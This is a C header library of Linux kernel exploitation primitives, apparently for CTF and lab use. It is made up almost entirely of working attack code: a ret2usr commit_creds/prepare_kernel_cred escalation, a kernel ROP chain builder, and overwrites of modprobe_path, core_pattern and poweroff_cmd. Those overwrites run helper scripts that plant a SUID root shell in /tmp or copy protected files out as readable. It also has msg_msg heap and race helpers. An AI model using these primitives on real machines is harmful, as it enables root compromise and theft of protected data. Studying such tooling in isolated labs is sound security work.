// Inspired by: https://github.com/n132/libx/blob/main/libx.c
// Intended for isolated kernel-pwn labs and CTF virtual machines.
#define _GNU_SOURCE
#ifndef LIBPWN_H
#define LIBPWN_H

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/resource.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define KERNEL_TEXT_BASE 0xffffffff81000000UL
size_t kernel_base = KERNEL_TEXT_BASE;
#define KADDR(addr) ((size_t)(addr) - KERNEL_TEXT_BASE + kernel_base)

int fd = -1;

#define TTY_FILE                         "/dev/ptmx"
#define DEFAULT_ROOT_SHELL               "/tmp/rootsh"

#define DEFAULT_MODPROBE_TRIGGER          "/tmp/modprobe_trigger"
#define DEFAULT_EVIL_MODPROBE_PATH        "/tmp/modprobe_helper"
#define DEFAULT_MODPROBE_RESULT            "/tmp/modprobe_result"

#define DEFAULT_CORE_PATTERN_HELPER       "/tmp/core_pattern_helper"
#define DEFAULT_CORE_PATTERN_RESULT       "/tmp/core_pattern_result"
#define CORE_PATTERN_PAYLOAD              "|" DEFAULT_CORE_PATTERN_HELPER
#define CORE_PATTERN_PAYLOAD_LEN          sizeof(CORE_PATTERN_PAYLOAD)
#define CORE_PATTERN_MAX                  128

#define DEFAULT_POWEROFF_HELPER           "/tmp/poweroff_helper"
#define DEFAULT_POWEROFF_RESULT           "/tmp/poweroff_result"
#define POWEROFF_CMD_PAYLOAD              DEFAULT_POWEROFF_HELPER
#define POWEROFF_CMD_PAYLOAD_LEN          sizeof(POWEROFF_CMD_PAYLOAD)
#define POWEROFF_CMD_MAX                  256

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg)    "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg)   "\033[31m\033[1m" msg "\033[0m"

#define log_success(fmt, ...) printf(SUCCESS_MSG(fmt "\n"), ##__VA_ARGS__)
#define log_info(fmt, ...)    printf(INFO_MSG(fmt "\n"), ##__VA_ARGS__)
#define log_error(fmt, ...)   printf(ERROR_MSG(fmt "\n"), ##__VA_ARGS__)

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

/*
 * Challenge-specific adapters.
 *
 * kwrite_bytes must copy exactly len bytes into kernel virtual address dst.
 * It can internally split the operation into qword/dword/byte writes.
 *
 * trigger_fn is useful for poweroff_cmd because reaching orderly_poweroff()
 * depends on the vulnerable driver or the exploit's control-flow primitive.
 */
typedef void (*kwrite_bytes_fn)(size_t dst, const void *src, size_t len);
typedef void (*trigger_fn)(void);

size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
size_t leak;

/* Common kernel symbol addresses. Set these after resolving KASLR. */
size_t commit_creds = 0;
size_t prepare_kernel_cred = 0;
size_t modprobe_path = 0;
size_t core_pattern = 0;
size_t poweroff_cmd = 0;
size_t orderly_poweroff = 0;

static void error(const char *msg)
{
    fprintf(stderr, ERROR_MSG("[!] %s: %s\n"), msg, strerror(errno));
    exit(EXIT_FAILURE);
}

static void die_msg(const char *msg)
{
    fprintf(stderr, ERROR_MSG("[!] %s\n"), msg);
    exit(EXIT_FAILURE);
}

static void write_file_exact(const char *path, const void *buf, size_t len,
                             mode_t mode)
{
    int out = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
    if (out < 0)
        error("open output file");

    const unsigned char *p = buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t n = write(out, p, remaining);
        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0) {
            close(out);
            error("write output file");
        }
        p += (size_t)n;
        remaining -= (size_t)n;
    }

    if (fchmod(out, mode) < 0) {
        close(out);
        error("fchmod output file");
    }

    if (close(out) < 0)
        error("close output file");
}

static void write_script(const char *path, const char *body)
{
    write_file_exact(path, body, strlen(body), 0755);
    log_success("[+] Wrote helper script -> %s", path);
}

static bool wait_for_suid_root_file(const char *path, unsigned attempts,
                                    useconds_t delay_us)
{
    struct stat st;

    for (unsigned i = 0; i < attempts; i++) {
        if (stat(path, &st) == 0 && st.st_uid == 0 &&
            (st.st_mode & S_ISUID) && (st.st_mode & S_IXUSR))
            return true;
        usleep(delay_us);
    }

    return false;
}

static bool wait_for_readable_file(const char *path, unsigned attempts,
                                   useconds_t delay_us)
{
    for (unsigned i = 0; i < attempts; i++) {
        if (access(path, R_OK) == 0)
            return true;
        usleep(delay_us);
    }

    return false;
}

static void spawn_suid_shell(const char *path)
{
    char *const argv[] = {(char *)"sh", (char *)"-p", NULL};
    char *const envp[] = {NULL};

    log_info("[*] Executing %s -p", path);
    execve(path, argv, envp);
    error("execve SUID shell");
}

static void spawn_shell(void)
{
    uid_t ruid = getuid();
    uid_t euid = geteuid();

    log_info("[*] Returned to userland: ruid=%u euid=%u",
             (unsigned)ruid, (unsigned)euid);

    if (euid != 0)
        die_msg("Returned to userland without effective UID 0");

    char *const argv[] = {(char *)"sh", (char *)"-p", NULL};
    char *const envp[] = {NULL};
    execve("/bin/sh", argv, envp);
    error("execve /bin/sh");
}

static void save_state(void)
{
    asm volatile(
        "mov %%cs, %0\n\t"
        "mov %%ss, %1\n\t"
        "mov %%rsp, %2\n\t"
        "pushfq\n\t"
        "pop %3\n\t"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp),
          "=r"(user_rflags)
        :
        : "memory"
    );

    user_rip = (size_t)spawn_shell;
    log_success("[+] Saved userland state");
}

/* -------------------------- ret2usr -------------------------- */

static void *(*prepare_kernel_cred_kfunc)(void *task_struct);
static int (*commit_creds_kfunc)(void *cred);

__attribute__((noreturn))
static void ret2usr_attack(void)
{
    if (!prepare_kernel_cred || !commit_creds)
        die_msg("Set prepare_kernel_cred and commit_creds first");

    prepare_kernel_cred_kfunc =
        (void *(*)(void *))prepare_kernel_cred;
    commit_creds_kfunc =
        (int (*)(void *))commit_creds;

    commit_creds_kfunc(prepare_kernel_cred_kfunc(NULL));

    asm volatile(
        "pushq %[ss]\n\t"
        "pushq %[sp]\n\t"
        "pushq %[rflags]\n\t"
        "pushq %[cs]\n\t"
        "pushq %[rip]\n\t"
        "swapgs\n\t"
        "iretq\n\t"
        :
        : [ss] "r"(user_ss),
          [sp] "r"(user_sp),
          [rflags] "r"(user_rflags),
          [cs] "r"(user_cs),
          [rip] "r"((size_t)spawn_shell)
        : "memory"
    );

    __builtin_unreachable();
}

/* -------------------------- kernel ROP -------------------------- */

static size_t *rop_commit(size_t i)
{
    /* Replace every placeholder with gadgets from the target vmlinux. */
    size_t pop_rdi = KADDR(0xffffffff8104b80dUL);
    size_t pop_rsi = KADDR(0xffffffff8104b80dUL);
    size_t pop_rcx = KADDR(0xffffffff8104b80dUL);
    size_t mov_rdi_rax = KADDR(0xffffffff8104b80dUL);

    size_t prepare_cred = KADDR(0xffffffff810b9c20UL);
    size_t commit = KADDR(0xffffffff810b9970UL);
    size_t swapgs_restore_regs_and_return_to_usermode =
        KADDR(0xffffffff8200180cUL);

    static size_t chain[100];
    memset(chain, 0, sizeof(chain));

    if (i + 17 >= sizeof(chain) / sizeof(chain[0]))
        die_msg("ROP chain start index is too large");

    chain[i++] = pop_rdi;
    chain[i++] = 0;
    chain[i++] = prepare_cred;
    chain[i++] = pop_rcx;
    chain[i++] = 1;
    chain[i++] = pop_rsi;
    chain[i++] = 20;
    chain[i++] = mov_rdi_rax;
    chain[i++] = commit;
    chain[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
    chain[i++] = 0;
    chain[i++] = 0;
    chain[i++] = (size_t)spawn_shell;
    chain[i++] = user_cs;
    chain[i++] = user_rflags;
    chain[i++] = user_sp;
    chain[i++] = user_ss;

    return chain;
}

/* -------------------------- shared UMH payloads -------------------------- */

static void prepare_suid_shell_helper(const char *helper_path)
{
    char script[1024];

    int n = snprintf(script, sizeof(script),
        "#!/bin/sh\n"
        "cp /bin/sh " DEFAULT_ROOT_SHELL "\n"
        "chown 0:0 " DEFAULT_ROOT_SHELL "\n"
        "chmod 4755 " DEFAULT_ROOT_SHELL "\n");

    if (n < 0 || (size_t)n >= sizeof(script))
        die_msg("SUID helper script was truncated");

    unlink(DEFAULT_ROOT_SHELL);
    write_script(helper_path, script);
}

/* Only pass trusted, fixed CTF paths to source_path. */
static void prepare_file_copy_helper(const char *helper_path,
                                     const char *source_path,
                                     const char *result_path)
{
    char script[PATH_MAX * 2 + 256];

    if (strchr(source_path, '\'') || strchr(result_path, '\''))
        die_msg("Single quotes are not supported in helper paths");

    int n = snprintf(script, sizeof(script),
        "#!/bin/sh\n"
        "cp -- '%s' '%s'\n"
        "chown 0:0 '%s'\n"
        "chmod 0644 '%s'\n",
        source_path, result_path, result_path, result_path);

    if (n < 0 || (size_t)n >= sizeof(script))
        die_msg("File-copy helper script was truncated");

    unlink(result_path);
    write_script(helper_path, script);
}

static void print_file(const char *path)
{
    FILE *f = fopen(path, "r");
    if (!f)
        error("fopen result file");

    char *line = NULL;
    size_t cap = 0;
    ssize_t n;

    while ((n = getline(&line, &cap, f)) >= 0)
        fwrite(line, 1, (size_t)n, stdout);

    free(line);
    fclose(f);
}

/* -------------------------- modprobe_path -------------------------- */

static void trigger_modprobe(void)
{
    static const unsigned char unknown_binary[] = {0xff, 0xff, 0xff, 0xff};

    write_file_exact(DEFAULT_MODPROBE_TRIGGER, unknown_binary,
                     sizeof(unknown_binary), 0755);

    char *const argv[] = {(char *)DEFAULT_MODPROBE_TRIGGER, NULL};
    char *const envp[] = {NULL};

    log_info("[*] Triggering request_module via %s",
             DEFAULT_MODPROBE_TRIGGER);
    execve(DEFAULT_MODPROBE_TRIGGER, argv, envp);

    /* ENOEXEC is expected in the original process; the kernel-side helper
       may already have run. A forked trigger is used by the wrappers below. */
}

static void trigger_modprobe_child(void)
{
    pid_t pid = fork();
    if (pid < 0)
        error("fork modprobe trigger");

    if (pid == 0) {
        trigger_modprobe();
        _exit(EXIT_FAILURE);
    }

    int status;
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR)
            error("waitpid modprobe trigger");
    }
}

static void modprobe_attack_root(kwrite_bytes_fn kwrite)
{
    if (!kwrite)
        die_msg("modprobe_attack_root requires kwrite_bytes");
    if (!modprobe_path)
        die_msg("Set modprobe_path first");

    prepare_suid_shell_helper(DEFAULT_EVIL_MODPROBE_PATH);
    kwrite(modprobe_path, DEFAULT_EVIL_MODPROBE_PATH,
           sizeof(DEFAULT_EVIL_MODPROBE_PATH));

    trigger_modprobe_child();

    if (!wait_for_suid_root_file(DEFAULT_ROOT_SHELL, 200, 10000))
        die_msg("modprobe helper did not create the SUID shell");

    spawn_suid_shell(DEFAULT_ROOT_SHELL);
}

static void modprobe_attack_read(kwrite_bytes_fn kwrite,
                                 const char *filename)
{
    if (!kwrite)
        die_msg("modprobe_attack_read requires kwrite_bytes");
    if (!modprobe_path)
        die_msg("Set modprobe_path first");

    prepare_file_copy_helper(DEFAULT_EVIL_MODPROBE_PATH, filename,
                             DEFAULT_MODPROBE_RESULT);
    kwrite(modprobe_path, DEFAULT_EVIL_MODPROBE_PATH,
           sizeof(DEFAULT_EVIL_MODPROBE_PATH));

    trigger_modprobe_child();

    if (!wait_for_readable_file(DEFAULT_MODPROBE_RESULT, 200, 10000))
        die_msg("modprobe helper did not create a readable result");

    print_file(DEFAULT_MODPROBE_RESULT);
}

/* -------------------------- core_pattern -------------------------- */

static void trigger_core_pattern(void)
{
    pid_t pid = fork();
    if (pid < 0)
        error("fork core_pattern trigger");

    if (pid == 0) {
        struct rlimit core_limit = {
            .rlim_cur = RLIM_INFINITY,
            .rlim_max = RLIM_INFINITY,
        };

        /* A piped core handler ignores RLIMIT_CORE, but setting it makes the
           trigger work consistently on older/minimal challenge images too. */
        (void)setrlimit(RLIMIT_CORE, &core_limit);
        (void)prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
        signal(SIGSEGV, SIG_DFL);
        raise(SIGSEGV);
        _exit(EXIT_FAILURE);
    }

    int status;
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR)
            error("waitpid core_pattern trigger");
    }
}

static void core_pattern_attack_root(kwrite_bytes_fn kwrite)
{
    if (!kwrite)
        die_msg("core_pattern_attack_root requires kwrite_bytes");
    if (!core_pattern)
        die_msg("Set core_pattern first");
    if (CORE_PATTERN_PAYLOAD_LEN > CORE_PATTERN_MAX)
        die_msg("core_pattern payload is too long");

    prepare_suid_shell_helper(DEFAULT_CORE_PATTERN_HELPER);
    kwrite(core_pattern, CORE_PATTERN_PAYLOAD, CORE_PATTERN_PAYLOAD_LEN);

    log_success("[+] core_pattern <- %s", CORE_PATTERN_PAYLOAD);
    trigger_core_pattern();

    if (!wait_for_suid_root_file(DEFAULT_ROOT_SHELL, 200, 10000))
        die_msg("core_pattern helper did not create the SUID shell");

    spawn_suid_shell(DEFAULT_ROOT_SHELL);
}

static void core_pattern_attack_read(kwrite_bytes_fn kwrite,
                                     const char *filename)
{
    if (!kwrite)
        die_msg("core_pattern_attack_read requires kwrite_bytes");
    if (!core_pattern)
        die_msg("Set core_pattern first");
    if (CORE_PATTERN_PAYLOAD_LEN > CORE_PATTERN_MAX)
        die_msg("core_pattern payload is too long");

    prepare_file_copy_helper(DEFAULT_CORE_PATTERN_HELPER, filename,
                             DEFAULT_CORE_PATTERN_RESULT);
    kwrite(core_pattern, CORE_PATTERN_PAYLOAD, CORE_PATTERN_PAYLOAD_LEN);

    log_success("[+] core_pattern <- %s", CORE_PATTERN_PAYLOAD);
    trigger_core_pattern();

    if (!wait_for_readable_file(DEFAULT_CORE_PATTERN_RESULT, 200, 10000))
        die_msg("core_pattern helper did not create a readable result");

    print_file(DEFAULT_CORE_PATTERN_RESULT);
}

/* -------------------------- poweroff_cmd -------------------------- */

/*
 * poweroff_cmd is consumed by orderly_poweroff(), not by the reboot(2)
 * power-off path and not generically by /proc/sysrq-trigger.
 *
 * Therefore trigger_orderly_poweroff must be supplied by the challenge:
 * for example, an ioctl path that calls orderly_poweroff(), a function-call
 * primitive, or a short ROP chain that invokes orderly_poweroff(false).
 */
static void poweroff_cmd_attack_root(kwrite_bytes_fn kwrite,
                                     trigger_fn trigger_orderly_poweroff)
{
    if (!kwrite)
        die_msg("poweroff_cmd_attack_root requires kwrite_bytes");
    if (!trigger_orderly_poweroff)
        die_msg("Provide an exploit-specific orderly_poweroff trigger");
    if (!poweroff_cmd)
        die_msg("Set poweroff_cmd first");
    if (POWEROFF_CMD_PAYLOAD_LEN > POWEROFF_CMD_MAX)
        die_msg("poweroff_cmd payload is too long");

    prepare_suid_shell_helper(DEFAULT_POWEROFF_HELPER);
    kwrite(poweroff_cmd, POWEROFF_CMD_PAYLOAD, POWEROFF_CMD_PAYLOAD_LEN);

    log_success("[+] poweroff_cmd <- %s", POWEROFF_CMD_PAYLOAD);
    trigger_orderly_poweroff();

    if (!wait_for_suid_root_file(DEFAULT_ROOT_SHELL, 300, 10000))
        die_msg("poweroff helper did not create the SUID shell");

    spawn_suid_shell(DEFAULT_ROOT_SHELL);
}

static void poweroff_cmd_attack_read(kwrite_bytes_fn kwrite,
                                     trigger_fn trigger_orderly_poweroff,
                                     const char *filename)
{
    if (!kwrite)
        die_msg("poweroff_cmd_attack_read requires kwrite_bytes");
    if (!trigger_orderly_poweroff)
        die_msg("Provide an exploit-specific orderly_poweroff trigger");
    if (!poweroff_cmd)
        die_msg("Set poweroff_cmd first");
    if (POWEROFF_CMD_PAYLOAD_LEN > POWEROFF_CMD_MAX)
        die_msg("poweroff_cmd payload is too long");

    prepare_file_copy_helper(DEFAULT_POWEROFF_HELPER, filename,
                             DEFAULT_POWEROFF_RESULT);
    kwrite(poweroff_cmd, POWEROFF_CMD_PAYLOAD, POWEROFF_CMD_PAYLOAD_LEN);

    log_success("[+] poweroff_cmd <- %s", POWEROFF_CMD_PAYLOAD);
    trigger_orderly_poweroff();

    if (!wait_for_readable_file(DEFAULT_POWEROFF_RESULT, 300, 10000))
        die_msg("poweroff helper did not create a readable result");

    print_file(DEFAULT_POWEROFF_RESULT);
}

/* -------------------------- race helpers -------------------------- */

static void bind_cpu(int core)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);

    if (sched_setaffinity(0, sizeof(set), &set) < 0)
        error("sched_setaffinity");
}

/* -------------------------- msg_msg helpers -------------------------- */

static int make_queue(key_t key, int msgflg)
{
    int result = msgget(key, msgflg);
    if (result == -1)
        error("msgget");
    return result;
}

static void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp,
                    int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
        error("msgrcv");
}

static void send_msg(int msqid, const void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
        error("msgsnd");
}

/* -------------------------- misc helpers -------------------------- */

static void dump_hex(const void *buf, size_t size)
{
    const unsigned long *q = buf;
    size_t count = size / sizeof(*q);

    for (size_t i = 0; i < count; i++)
        printf(SUCCESS_MSG("[+] %zu - 0x%016lx\n"), i, q[i]);
}

static void ppause(void)
{
    log_info("[*] Press Enter to continue");
    (void)getchar();
}

static void info(const char *msg, unsigned long val)
{
    printf(INFO_MSG("[*] %s: 0x%016lx\n"), msg, val);
}

#endif /* LIBPWN_H */